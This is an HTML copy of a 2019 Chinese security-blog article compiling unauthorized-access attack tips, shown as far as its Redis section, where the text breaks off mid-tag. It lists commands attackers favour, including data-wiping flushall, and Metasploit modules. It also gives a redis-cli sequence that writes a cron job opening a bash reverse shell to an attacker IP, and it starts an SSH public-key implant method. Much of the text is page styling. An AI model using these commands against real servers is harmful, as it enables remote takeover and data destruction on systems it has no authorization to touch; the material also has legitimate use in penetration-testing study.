<html>
<head>
<title>WIKI未授权访问的tips</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
WIKI | 未授权访问的tips
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    evi1ox
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-02-19</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="text-align: center;" data-mpa-powered-by="yiban.io"><img class="" data-copyright="0" data-ratio="0.3188202247191011" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/1_aPbK6xQJIHiaUOB16u0KcQnicDG9pg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNacP7iaHc5fOEUUHZIlTV3uyqOmgKiaPbK6xQJIHiaUOB16u0KcQnicDG9pg/640?wx_fmt=png'" data-type="png" data-w="712" style=""  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">前言</a></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">知识那么多,大佬们学慢点,我营养跟不上啦! 前人栽树后人乘凉,本文主要是把一些资料依葫芦画瓢学习了下,做了个汇总.</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x00 小二上酒</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://github.com/se55i0n/DBScanner</p><blockquote style="padding-right: 15px;padding-left: 15px;margin-bottom: 24px;border-left-width: 4px;border-left-color: rgb(221, 221, 221);color: rgb(119, 119, 119);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><p style="font-size: 17.5px;line-height: 1.25;">a)Redis未授权访问<br  />b)Jenkins未授权访问<br  />c)MongoDB未授权访问<br  />d)ZooKeeper未授权访问<br  />e)Elasticsearch未授权访问<br  />f)Memcache未授权访问<br  />g)Hadoop未授权访问<br  />h)CouchDB未授权访问<br  />i)Docker未授权访问</p></blockquote><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x01 Redis未授权访问</h2><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">1.扫描探测</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(1). 测试时建议 vim /etc/redis.conf</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">（1）cp redis.conf ./src/redis.conf
 &nbsp; &nbsp;（2）bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0
 &nbsp; &nbsp;（3）protected-mode设为no
 &nbsp; &nbsp;（4）启动redis-server &nbsp;------&gt; &nbsp; ./src/redis-server redis.conf</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(2). 攻击者喜欢的命令</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">（1）查看信息：info
 &nbsp; &nbsp;（2）删除所有数据库内容：flushall
 &nbsp; &nbsp;（3）刷新数据库：flushdb
 &nbsp; &nbsp;（4）看所有键：KEYS *，使用select num可以查看键值数据。
 &nbsp; &nbsp;（5）设置变量：set test "who am i"
 &nbsp; &nbsp;（6）config set dir dirpath 设置路径等配置
 &nbsp; &nbsp;（7）config get dir/dbfilename 获取路径及数据配置信息
 &nbsp; &nbsp;（8）save保存
 &nbsp; &nbsp;（9）get 变量，查看变量名称</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(3). msf下利用模块</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">auxiliary/scanner/redis/file_upload 
 &nbsp; &nbsp;auxiliary/scanner/redis/redis_login
 &nbsp; &nbsp;auxiliary/scanner/redis/redis_server</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(4). nmap及获取信息</strong><br  /></p><p><img class="" data-copyright="0" data-ratio="0.5995975855130785" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/2_LoECia5EzAptD4Uhpk5rnAhB8WIxwQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUBzzVXXEryFicaIiawxIlZicFwialXLoECia5EzAptD4Uhpk5rnAhB8WIxwQ/640?wx_fmt=png'" data-type="png" data-w="1988" style=""  /></p><p><img class="" data-copyright="0" data-ratio="0.6556655665566556" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/3_1GBARaV8iaOgBoiaPcZXntycWIM9KA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUg2zzTTHIW2L6q0JkZFb8kiaOzX51GBARaV8iaOgBoiaPcZXntycWIM9KA/640?wx_fmt=png'" data-type="png" data-w="1818" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">匿名扫描脚本:https://xz.aliyun.com/t/528<br  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.攻击的几种方法</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">参考:<br  />http://www.cnblogs.com/xiaozi/p/7568272.html<br  />https://evi1cg.me/archives/hackredis.html</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(1).利用计划任务执行命令反弹shell</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在redis以root权限运行时可以写crontab来执行命令反弹shell<br  />先在自己的服务器上监听一个端口</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">nc -lvnp 7999</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后执行命令:</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">root@kali:~## redis-cli -h 192.168.63.130
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n"
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; config set dir /var/spool/cron/
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; config set dbfilename root
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; save</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ps:此处使用bash反弹shell，也可使用其他方法<br  /><strong>(2).写ssh-keygen公钥然后使用私钥登陆</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在以下条件下，可以利用此方法</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">1、Redis服务使用ROOT账号启动</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。<br  />首先在本地生成一对密钥：<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">root@kali<span class="hljs-default-symbol" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">:~/</span>.ssh<span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 132px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;">## ssh-keygen -t rsa</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, 